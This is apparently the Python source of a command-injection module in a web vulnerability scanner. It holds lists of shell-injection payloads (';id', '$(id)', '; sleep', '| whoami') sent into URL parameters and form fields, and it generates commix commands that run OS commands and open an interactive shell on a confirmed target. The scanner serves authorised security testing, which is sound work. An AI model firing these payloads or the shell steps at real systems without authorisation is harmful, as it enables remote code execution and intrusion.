"""
command_injection — detects OS command injection in URL parameters and form fields.

Two verification techniques (proof, not guesswork):
  1. Output-based — inject a command (id / whoami / dir) and match its output in the response
     (uid=0(root), Volume Serial Number, …).
  2. Time-based — inject a sleep/timeout/ping and confirm the response delay SCALES with the
     requested time (5s clearly longer than 2s), ruling out a slow endpoint.

A confirmed hit is CRITICAL (remote code execution). Skipped in safe mode. A ready commix
command is attached for exploitation on authorised targets.
"""
from __future__ import annotations

import re
from concurrent.futures import ThreadPoolExecutor, as_completed

from scanner.engine import Finding, Severity, ScanEngine
from scanner.vulns._common import Injector, evidence, is_safe_mode, iter_injectors, timed_get

MODULE = "command_injection"
_TIME_LONG, _TIME_SHORT, _TIME_MAX = 5, 2, 8

_OUTPUT_PAYLOADS = [
    ";id", "|id", "||id", "&&id", "\nid", "$(id)", "`id`",
    "; whoami", "| whoami", "& whoami",
    "& ipconfig", "| dir", "& dir",
]

_OUTPUT_RE = re.compile(
    r"uid=\d+\([a-z0-9_]+\)|gid=\d+\(|Volume Serial Number|Directory of |Windows IP Configuration",
    re.IGNORECASE)

_TIME_PAYLOADS = [
    "; sleep {t}", "| sleep {t}", "|| sleep {t}", "$(sleep {t})", "`sleep {t}`",
    "& timeout /t {t}", "| ping -n {t} 127.0.0.1",
]


def _exploitation_steps(inj: Injector, payload: str) -> list[dict]:
    """The commix kill chain to weaponise a confirmed OS command injection. Authorised targets only."""
    target = (inj.proof(payload) if inj.proof else None) or inj.url or "<injectable request>"
    return [
        {"step": 1, "description": "Confirm the RCE and auto-detect the injection technique.",
         "command": f'commix -u "{target}" --batch'},
        {"step": 2, "description": "Run a single OS command as proof of execution.",
         "command": f'commix -u "{target}" --batch --os-cmd="id"'},
        {"step": 3, "description": "Drop into an interactive pseudo-shell on the host.",
         "command": f'commix -u "{target}" --batch --os-shell'},
    ]


def _finding(inj: Injector, payload: str, technique: str, signal: str,
             proof_lines: list[str] | None = None) -> Finding:
    proof_url = inj.proof(payload) if inj.proof else None
    commix = f'commix -u "{proof_url}"' if proof_url else None
    return Finding(
        module=MODULE,
        title=f"OS Command Injection ({technique}): {inj.param}",
        description=(f"Input to {inj.label} executes OS commands ({technique} verification). "
                     f"Payload: {payload!r}." + (f" Output signal: {signal!r}." if signal else "")
                     + (f"\n\nExploit with commix (authorised targets only):\n  {commix}" if commix else "")),
        severity=Severity.CRITICAL,
        recommendation=("Never pass user input to a shell. Use language-native APIs with an argument "
                        "array (no shell), validate against an allowlist, and strip shell metacharacters."),
        raw={"location": inj.label, "parameter": inj.param, "technique": technique,
             "payload": payload, "proof_url": proof_url, "commix": commix, "confidence": "high",
             "evidence": proof_lines or [f"injected into {inj.label}: {payload}"],
             "exploitation": _exploitation_steps(inj, payload)},
    )


def _test(engine: ScanEngine, inj: Injector, allow_time: bool) -> Finding | None:
    # 1. Output-based
    for payload in _OUTPUT_PAYLOADS:
        resp = inj.inject(payload)
        if resp is not None and (m := _OUTPUT_RE.search(resp.text)):
            return _finding(inj, payload, "output-based", m.group(0),
                            evidence(inj, payload, resp,
                                     indicator=f"command output in response: {m.group(0)}"))

    # 2. Time-based (URL parameters only — needs a timeable proof URL)
    if allow_time and inj.proof:
        base = timed_get(engine, inj.proof("1"))
        if base is not None:
            for tmpl in _TIME_PAYLOADS:
                long_t = timed_get(engine, inj.proof(tmpl.format(t=_TIME_LONG)))
                if long_t is None or (long_t - base) < _TIME_LONG - 1.5:
                    continue
                short_t = timed_get(engine, inj.proof(tmpl.format(t=_TIME_SHORT)))
                if short_t is not None and (long_t - short_t) >= (_TIME_LONG - _TIME_SHORT) - 1.5:
                    long_payload = tmpl.format(t=_TIME_LONG)
                    return _finding(
                        inj, long_payload, "time-based", "",
                        [f"injected into {inj.label}: {long_payload}",
                         f"matched: response delay scales — {long_t:.1f}s (t={_TIME_LONG}) vs "
                         f"{short_t:.1f}s (t={_TIME_SHORT}) vs {base:.1f}s baseline"])
    return None


def run(engine: ScanEngine) -> list[Finding]:
    if is_safe_mode(engine):
        return [Finding(MODULE, "Command Injection Scan Skipped (Safe Mode)",
                        "Active command-injection probing was skipped because safe mode is enabled.",
                        Severity.INFO, "Re-run without safe mode on an authorised target.",
                        {"reason": "safe_mode", "confidence": "high"})]

    injectors = iter_injectors(engine)
    if not injectors:
        return [Finding(MODULE, "Command Injection: No Injectable Inputs Found",
                        "No URL parameters or form fields were discovered to test.",
                        Severity.INFO, "", {"confidence": "high"})]

    findings: list[Finding] = []
    with ThreadPoolExecutor(max_workers=engine.threads) as pool:
        futures = {pool.submit(_test, engine, inj, i < _TIME_MAX): inj
                   for i, inj in enumerate(injectors)}
        for future in as_completed(futures):
            result = future.result()
            if result:
                findings.append(result)

    if not findings:
        return [Finding(MODULE, "Command Injection: None Detected",
                        f"Tested {len(injectors)} input(s) with output- and time-based techniques.",
                        Severity.INFO, "", {"inputs_tested": len(injectors), "confidence": "high"})]
    return findings
